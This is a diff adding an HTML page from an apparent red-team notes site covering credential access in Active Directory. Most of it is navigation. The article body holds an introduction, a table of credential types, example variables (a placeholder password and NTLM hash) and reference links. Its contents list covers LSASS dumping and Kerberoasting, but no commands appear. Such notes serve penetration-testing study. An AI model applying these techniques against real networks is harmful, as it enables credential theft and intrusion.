@@ -1,0 +1,3569 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/AD/Credential_Access/">
+      
+      
+        <link rel="prev" href="../Auth_Attacks/">
+      
+      
+        <link rel="next" href="../Kerberos_Attacks/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Credential Access - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#credential-access" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Credential Access
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Unauth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unauthenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Auth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asrep-roasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ASREP Roasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#password-spraying" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password Spraying
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#password-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password Policy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-hunting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Hunting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sysvol-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SYSVOL Credentials
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gpp-cpassword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GPP cpassword
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shares-secrets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shares Secrets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lsass-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LSASS Dumping
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dpapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DPAPI
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#browser-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Browser Credentials
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#keepass-hunting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        KeePass Hunting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hashes-tickets-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hashes Tickets Tokens
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kerberos_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NTLM_Relay_and_Coercion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay & Coercion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ACL_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lateral_Movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Priv_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Domain_Compromise/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Persistance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cross_Forest_and_Trusts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross Forest & Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Toolset/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Toolset
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/IDOR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR (Insecure Direct Object Reference)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="credential-access">Credential Access</h1>
+<p>Credential access in Active Directory focuses on obtaining usable authentication material after initial access or authenticated enumeration.</p>
+<p>This can include passwords, hashes, Kerberos tickets, DPAPI secrets, browser credentials, KeePass databases, credentials in SYSVOL, credentials in shares, LSASS material, and reusable tokens.</p>
+<p>Common credential material:</p>
+<table>
+<thead>
+<tr>
+<th>Material</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Password</td>
+<td>Plaintext secret.</td>
+</tr>
+<tr>
+<td>NT hash</td>
+<td>Password-derived Windows hash.</td>
+</tr>
+<tr>
+<td>NetNTLMv1/v2</td>
+<td>NTLM challenge-response material.</td>
+</tr>
+<tr>
+<td>TGT</td>
+<td>Kerberos Ticket Granting Ticket.</td>
+</tr>
+<tr>
+<td>TGS</td>
+<td>Kerberos service ticket.</td>
+</tr>
+<tr>
+<td>DPAPI masterkey</td>
+<td>Key material used to protect user secrets.</td>
+</tr>
+<tr>
+<td>Browser secret</td>
+<td>Saved web credential, cookie, or token.</td>
+</tr>
+<tr>
+<td>KeePass database</td>
+<td>Encrypted password vault file.</td>
+</tr>
+<tr>
+<td>Certificate / PFX</td>
+<td>Certificate material usable for authentication in some environments.</td>
+</tr>
+</tbody>
+</table>
+<p>Basic variables used in examples:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NETBIOS</span><span class="o">=</span>CORP
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">USER</span><span class="o">=</span>alice
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password123!&#39;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_IP</span><span class="o">=</span><span class="m">10</span>.10.10.10
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_HOST</span><span class="o">=</span>dc01.corp.local
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span><span class="m">10</span>.10.10.20
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">export</span><span class="w"> </span><span class="nv">RANGE</span><span class="o">=</span><span class="m">10</span>.10.10.0/24
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NTLM</span><span class="o">=</span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span>
+</span></code></pre></div>
+<p>Useful resources:</p>
+<ul>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks - Active Directory Methodology</a></li>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html">HackTricks - Stealing Windows Credentials</a></li>
